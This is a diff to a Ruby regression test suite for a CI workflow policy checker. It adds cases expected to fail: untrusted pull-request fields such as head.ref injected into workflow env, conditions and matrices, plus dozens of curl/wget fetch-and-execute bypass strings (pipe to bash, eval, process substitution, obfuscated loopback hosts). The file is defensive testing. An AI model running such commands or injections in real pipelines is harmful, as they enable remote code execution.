@@ -6,6 +6,7 @@ require 'tmpdir'
 require 'yaml'
 
 checker = File.expand_path('check-workflow-policy.rb', __dir__)
+fixture_generator = File.expand_path('create-secret-scan-regression-fixtures.sh', __dir__)
 safe_sha = '0123456789abcdef0123456789abcdef01234567'
 
 def checkout_step(safe_sha)
@@ -31,6 +32,12 @@ def workflow_yaml(safe_sha, events: ['push'], permissions: { 'contents' => 'read
     'permissions' => permissions,
     'jobs' => jobs || { 'test' => standard_job(safe_sha) }
   }
+  YAML.dump(workflow)
+end
+
+def amend_workflow(source)
+  workflow = YAML.safe_load(source, permitted_classes: [], permitted_symbols: [], aliases: false)
+  yield workflow
   YAML.dump(workflow)
 end
 
@@ -630,6 +637,53 @@ add_case.call(
   workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo safe', 'continue-on-error' => false }]) }),
   true
 )
+
+untrusted_context_cases = {
+  'untrusted-context-in-top-level-env' => lambda { |workflow| workflow['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
+  'untrusted-context-in-job-env' => lambda { |workflow| workflow['jobs']['test']['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
+  'untrusted-context-in-step-env' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
+  'untrusted-context-in-action-with' => lambda { |workflow| workflow['jobs']['test']['steps'][0]['with']['ref'] = '${{ github.event.pull_request.head.ref }}' },
+  'untrusted-context-in-job-if' => lambda { |workflow| workflow['jobs']['test']['if'] = '${{ github.event.pull_request.head.ref }}' },
+  'untrusted-context-in-step-if' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = '${{ github.event.pull_request.head.ref }}' },
+  'untrusted-context-in-job-output' => lambda { |workflow| workflow['jobs']['test']['outputs'] = { 'head' => '${{ github.event.pull_request.head.ref }}' } },
+  'untrusted-context-in-step-output' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['outputs'] = { 'head' => '${{ github.event.pull_request.head.ref }}' } },
+  'untrusted-context-in-matrix' => lambda { |workflow| workflow['jobs']['test']['strategy'] = { 'matrix' => { 'head' => ['${{ github.event.pull_request.head.ref }}'] } } },
+  'untrusted-context-in-concurrency' => lambda { |workflow| workflow['concurrency'] = { 'group' => '${{ github.event.pull_request.head.ref }}' } },
+  'untrusted-context-in-working-directory' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['working-directory'] = '${{ github.event.pull_request.head.ref }}' },
+  'untrusted-context-in-shell' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['shell'] = '${{ github.event.pull_request.head.ref }}' },
+  'untrusted-context-bracket-notation-outside-run' => lambda { |workflow| workflow['env'] = { 'HEAD' => "${{ github['event']['pull_request']['head']['ref'] }}" } },
+  'untrusted-context-whole-event-outside-run' => lambda { |workflow| workflow['name'] = '${{ github.event }}' },
+  'untrusted-context-nested-function-outside-run' => lambda { |workflow| workflow['concurrency'] = { 'group' => "${{ format('{0}', contains(toJSON(github.event.pull_request), github.sha)) }}" } },
+  'untrusted-context-in-reusable-workflow-input' => lambda do |workflow|
+    workflow['jobs']['reuse'] = {
+      'uses' => "actions/checkout/.github/workflows/reusable.yml@#{safe_sha}",
+      'timeout-minutes' => 5,
+      'permissions' => { 'contents' => 'read' },
+      'with' => { 'head' => '${{ github.event.pull_request.head.ref }}' }
+    }
+  end
+}
+
+untrusted_context_cases.each do |name, mutation|
+  content = amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) }
+  add_case.call(
+    name,
+    content,
+    false,
+    'direct github context interpolation is forbidden except github.sha and github.event_name'
+  )
+end
+
+add_case.call(
+  'safe-github-sha-in-env',
+  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['env'] = { 'COMMIT' => '${{ github.sha }}' } },
+  true
+)
+add_case.call(
+  'safe-github-event-name-in-if',
+  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs']['test']['if'] = "${{ github.event_name == 'push' }}" },
+  true
+)
 {
   'whole-pull-request-context' => 'echo "${{ github.event.pull_request }}"',
   'whole-event-context' => 'echo "${{ github.event }}"',
@@ -662,7 +716,7 @@ add_case.call(
     name,
     workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
     false,
-    'direct github context interpolation in run is forbidden except github.sha and github.event_name'
+    'direct github context interpolation is forbidden except github.sha and github.event_name'
   )
 end
 add_case.call(
@@ -689,13 +743,13 @@ add_case.call(
   'trusted-pr-number-in-run',
   workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.event.pull_request.number }}"' }]) }),
   false,
-  'direct github context interpolation in run is forbidden except github.sha and github.event_name'
+  'direct github context interpolation is forbidden except github.sha and github.event_name'
 )
 add_case.call(
   'trusted-pr-base-ref-in-run',
   workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.event.pull_request.base.ref }}"' }]) }),
   false,
-  'direct github context interpolation in run is forbidden except github.sha and github.event_name'
+  'direct github context interpolation is forbidden except github.sha and github.event_name'
 )
 add_case.call(
   'untrusted-pr-body-bracket-in-run',
@@ -709,59 +763,167 @@ add_case.call(
     }
   ),
   false,
-  'direct github context interpolation in run is forbidden except github.sha and github.event_name'
+  'direct github context interpolation is forbidden except github.sha and github.event_name'
 )
 
-add_case.call(
-  'curl-pipe-bash',
-  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'curl -fsSL https://example.invalid/install | bash' }]) }),
-  false,
-  'downloader output must not be piped or executed indirectly'
-)
-add_case.call(
-  'wget-pipe-sh',
-  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'wget -qO- https://example.invalid/install | sh' }]) }),
-  false,
-  'downloader output must not be piped or executed indirectly'
-)
-add_case.call(
-  'curl-pipe-bin-bash',
-  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'curl -fsSL https://example.invalid/install | /bin/bash' }]) }),
-  false,
-  'downloader output must not be piped or executed indirectly'
-)
-add_case.call(
-  'wget-pipe-env-sh',
-  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'wget -qO- https://example.invalid/install | env sh' }]) }),
-  false,
-  'downloader output must not be piped or executed indirectly'
-)
-{
+# Parser/adversarial bypass cases: any curl/wget run outside the exact literal probe must fail.
+downloader_parser_adversarial_cases = {
+  'curl-pipe-bash' => 'curl -fsSL https://example.invalid/install | bash',
+  'wget-pipe-sh' => 'wget -qO- https://example.invalid/install | sh',
+  'curl-pipe-bin-bash' => 'curl -fsSL https://example.invalid/install | /bin/bash',
+  'wget-pipe-env-sh' => 'wget -qO- https://example.invalid/install | env sh',
+  'curl-pipe-shell' => 'curl -fsSL https://example.invalid/install | sh',
   'curl-pipe-sudo-bash' => 'curl -fsSL https://example.invalid/install | sudo bash',
+  'wget-pipe-command' => 'wget -qO- https://example.invalid/install | command sh',
   'wget-pipe-command-sh' => 'wget -qO- https://example.invalid/install | command sh',
   'curl-pipe-nonshell' => 'curl -fsSL https://example.invalid/data | jq .',
+  'process-substitution' => 'bash <(curl -fsSL https://example.invalid/install)',
   'bash-process-substitution-curl' => 'bash <(curl -fsSL https://example.invalid/install)',
+  'command-substitution' => 'sh -c "$(wget -qO- https://example.invalid/install)"',
   'shell-command-substitution-wget' => 'sh -c "$(wget -qO- https://example.invalid/install)"',
-  'eval-curl-substitution' => 'eval "$(curl -fsSL https://example.invalid/install)"'
-}.each do |name, command|
+  'eval-substitution' => 'eval "$(curl -fsSL https://example.invalid/install)"',
+  'eval-curl-substitution' => 'eval "$(curl -fsSL https://example.invalid/install)"',
+  'curl-download-file-then-bash' => 'curl -fsSL -o /tmp/install.sh https://example.invalid/install.sh && bash /tmp/install.sh',
+  'wget-download-file-then-sh' => 'wget -q -O /tmp/install.sh https://example.invalid/install.sh && sh /tmp/install.sh',
+  'curl-download-binary-then-execute' => 'curl -fsSL -o /tmp/tool https://example.invalid/tool && chmod +x /tmp/tool && /tmp/tool',
+  'wget-download-chmod-execute' => 'wget -q -O /tmp/tool https://example.invalid/tool && chmod +x /tmp/tool && /tmp/tool',
+  'curl-download-via-output-option' => 'curl --output /tmp/data https://example.invalid/data',
+  'wget-download-via-output-document' => 'wget --output-document=/tmp/data https://example.invalid/data',
+  'external-curl-with-checksum-still-forbidden-v1' => 'curl -fsSL -o /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
+  'external-wget-with-checksum-still-forbidden-v1' => 'wget -q -O /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
+  'curl-variable-url-with-loopback-comment' => 'curl --disable --fail --silent --show-error --max-time 10 "$URL" >/dev/null # http://127.0.0.1:3000/health',
+  'curl-variable-url-from-previous-line' => "URL=http://127.0.0.1:3000/health\ncurl --disable --fail --silent --show-error --max-time 10 \"$URL\" >/dev/null",
+  'curl-loopback-command-substitution-then-bash' => 'bash -c "$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)"',
+  'curl-loopback-response-assigned-then-executed' => "PAYLOAD=\"$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)\"\nbash -c \"$PAYLOAD\"",
+  'curl-loopback-follow-redirect' => 'curl --disable --fail --silent --show-error --location --max-time 10 http://127.0.0.1:3000/health >/dev/null',
+  'curl-loopback-short-L' => 'curl --disable --fail --silent --show-error -L --max-time 10 http://127.0.0.1:3000/health >/dev/null',
+  'curl-loopback-combined-sSLO' => 'curl -sSLO http://127.0.0.1:3000/health',
+  'curl-loopback-output-file' => 'curl --disable --fail --silent --show-error --max-time 10 --output /tmp/health http://127.0.0.1:3000/health',
+  'curl-loopback-remote-name' => 'curl --disable --fail --silent --show-error --max-time 10 --remote-name http://127.0.0.1:3000/health',
+  'curl-config-file' => 'curl --config ./curl.conf http://127.0.0.1:3000/health',
+  'curl-short-K-config' => 'curl -K ./curl.conf http://127.0.0.1:3000/health',
+  'curl-loopback-pipe' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health | jq .',
+  'curl-loopback-command-chain' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null && bash /tmp/install.sh',
+  'curl-loopback-semicolon-command' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null; bash /tmp/install.sh',
+  'curl-loopback-comment-injection' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null # trusted',
+  'curl-loopback-multiple-urls' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health https://example.invalid/payload >/dev/null',
+  'curl-loopback-backtick' => '`curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health`',
+  'curl-loopback-process-substitution' => 'bash <(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)',
+  'curl-loopback-to-eval' => 'eval "$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)"',
+  'curl-loopback-to-source' => 'source <(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)',
+  'wget-loopback-health-check' => 'wget --spider http://127.0.0.1:3000/health',
+  'wget-external-download' => 'wget https://example.invalid/install.sh',
+  'external-curl-with-fake-loopback-comment' => 'curl --disable --fail --silent --show-error --max-time 10 https://example.invalid/install # http://127.0.0.1:3000/health',
+  'external-curl-with-checksum' => 'curl --disable --fail --silent --show-error --max-time 10 --output /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
+  'curl-loopback-no-timeout' => 'curl --disable --fail --silent --show-error http://127.0.0.1:3000/health >/dev/null',
+  'curl-loopback-numeric-host' => 'curl --disable --fail --silent --show-error --max-time 10 http://2130706433:3000/health >/dev/null',
+  'curl-loopback-hex-host' => 'curl --disable --fail --silent --show-error --max-time 10 http://0x7f000001:3000/health >/dev/null',
+  'curl-loopback-userinfo' => 'curl --disable --fail --silent --show-error --max-time 10 http://user@127.0.0.1:3000/health >/dev/null',
+  'curl-loopback-port-overflow' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:65536/health >/dev/null',
+  'curl-loopback-env-expansion' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:${PORT}/health >/dev/null',
+  'curl-loopback-ordinary-file-redirect' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >health.txt',
+  'curl-loopback-without-config-disable' => 'curl --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null'
+}
+
+downloader_parser_adversarial_cases.each do |name, command|
   add_case.call(
     name,
     workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
     false,
-    'downloader output must not be piped or executed indirectly'
+    'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
   )
 end
 add_case.call(
-  'download-file-then-checksum',
+  'download-in-one-step-execute-in-next-step',
+  workflow_yaml(
+    safe_sha,
+    jobs: {
+      'unsafe' => standard_job(
+        safe_sha,
+        'steps' => [
+          { 'run' => 'curl -fsSL -o /tmp/install.sh https://example.invalid/install.sh' },
+          { 'run' => 'bash /tmp/install.sh' }
+        ]
+      )
+    }
+  ),
+  false,
+  'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
+)
+add_case.call(
+  'download-one-step-execute-next-step',
+  workflow_yaml(
+    safe_sha,
+    jobs: {
+      'unsafe' => standard_job(
+        safe_sha,
+        'steps' => [
+          { 'run' => 'curl --output /tmp/install.sh https://example.invalid/install.sh' },
+          { 'run' => 'bash /tmp/install.sh' }
+        ]
+      )
+    }
+  ),
+  false,
+  'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
+)
+
+# Valid workflow semantic cases: the complete run string is the literal policy-v1 probe.
+add_case.call(
+  'curl-literal-127-health-check',
   workflow_yaml(
     safe_sha,
     jobs: {
       'safe' => standard_job(
         safe_sha,
-        'steps' => [{ 'run' => 'curl -fsSL -o /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt' }]
+        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null' }]
       )
     }
   ),
+  true
+)
+add_case.call(
+  'curl-literal-localhost-health-check',
+  workflow_yaml(
+    safe_sha,
+    jobs: {
+      'safe' => standard_job(
+        safe_sha,
+        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null' }]
+      )
+    }
+  ),
+  true
+)
+add_case.call(
+  'curl-literal-ipv6-loopback-health-check',
+  workflow_yaml(
+    safe_sha,
+    jobs: {
+      'safe' => standard_job(
+        safe_sha,
+        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://[::1]:3000/health >/dev/null' }]
+      )
+    }
+  ),
+  true
+)
+add_case.call(
+  'curl-loopback-health-check',
+  workflow_yaml(
+    safe_sha,
+    jobs: {
+      'safe' => standard_job(
+        safe_sha,
+        'steps' => [{ 'run' => "curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null\n" }]
+      )
+    }
+  ),
+  true
+)
+add_case.call(
+  'curl-localhost-health-check',
+  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null' }]) }),
   true
 )
 add_case.call(
@@ -817,4 +979,78 @@ Dir.mktmpdir('graylum-workflow-policy-') do |root|
   end
 end
 
+repository_root = File.expand_path('../..', __dir__)
+danger_root = Dir.mktmpdir('graylum-unexpected-fixture-root-')
+sentinel = File.join(danger_root, 'must-survive.txt')
+File.write(sentinel, 'do not delete')
+
+dangerous_fixture_cases = [
+  ['missing-argument', []],
+  ['empty-path', ['']],
+  ['filesystem-root', ['/']],
+  ['current-directory', ['.']],
+  ['parent-directory', ['..']],
+  ['repository-root', [repository_root]],
+  ['unexpected-temp-directory', [danger_root]]
+]
+
+begin
+  dangerous_fixture_cases.each do |name, arguments|
+    _stdout, _stderr, status = Open3.capture3(
+      { 'GITHUB_WORKSPACE' => repository_root },
+      'bash',
+      fixture_generator,
+      *arguments
+    )
+    next unless status.success?
+
+    warn "#{name}: fixture generator accepted a dangerous target"
+    exit 1
+  end
+
+  workspace_fixture_root = File.join(Dir.tmpdir, "graylum-secret-scan-fixtures.workspace.#{Process.pid}.#{rand(1_000_000)}")
+  _stdout, _stderr, workspace_status = Open3.capture3(
+    { 'GITHUB_WORKSPACE' => Dir.tmpdir },
+    'bash',
+    fixture_generator,
+    workspace_fixture_root
+  )
+  if workspace_status.success? || File.exist?(workspace_fixture_root)
+    warn 'github-workspace-root: fixture generator accepted or created a target inside GITHUB_WORKSPACE'
+    exit 1
+  end
+
+  unless File.file?(sentinel)
+    warn 'fixture generator deleted caller-owned content'
+    exit 1
+  end
+
+  safe_fixture_root = File.join(Dir.tmpdir, "graylum-secret-scan-fixtures.#{Process.pid}.#{rand(1_000_000)}")
+  while File.exist?(safe_fixture_root)
+    safe_fixture_root = File.join(Dir.tmpdir, "graylum-secret-scan-fixtures.#{Process.pid}.#{rand(1_000_000)}")
+  end
+
+  _stdout, stderr, status = Open3.capture3(
+    { 'GITHUB_WORKSPACE' => repository_root },
+    'bash',
+    fixture_generator,
+    safe_fixture_root
+  )
+  unless status.success?
+    warn "safe fixture directory was rejected: #{stderr}"
+    exit 1
+  end
+
+  generated_files = Dir.glob(File.join(safe_fixture_root, '{docs,tests}', '*')).select { |path| File.file?(path) }
+  unless generated_files.length == 6
+    warn "expected 6 generated fixture files, got #{generated_files.length}"
+    exit 1
+  end
+ensure
+  FileUtils.rm_rf(safe_fixture_root) if defined?(safe_fixture_root) && safe_fixture_root.start_with?(Dir.tmpdir)
+  FileUtils.rm_rf(workspace_fixture_root) if defined?(workspace_fixture_root) && workspace_fixture_root.start_with?(Dir.tmpdir)
+  FileUtils.rm_rf(danger_root)
+end
+
+puts "Fixture directory safety regressions passed (#{dangerous_fixture_cases.length + 1} dangerous targets rejected)."
 puts "Workflow policy regression tests passed (#{cases.length} cases, #{cases.length - passing_cases} bypass attempts)."
